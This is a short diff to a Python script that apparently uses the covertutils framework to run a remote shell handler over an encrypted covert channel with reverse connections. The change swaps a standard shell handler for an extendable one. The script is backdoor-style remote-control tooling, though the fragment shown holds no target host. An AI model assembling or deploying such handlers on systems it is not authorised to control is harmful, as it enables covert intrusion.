@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-from covertutils.handlers.impl import StandardShellHandler
+from covertutils.handlers.impl import StandardShellHandler, ExtendableShellHandler
 from covertutils.orchestration import SimpleOrchestrator
 
 import sys
@@ -41,6 +41,6 @@ while True :
     	return s.send( raw )
 
     orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True, cycling_algorithm = sha512 )
-    handler = StandardShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
+    handler = ExtendableShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
 
     while not closed : sleep(1)
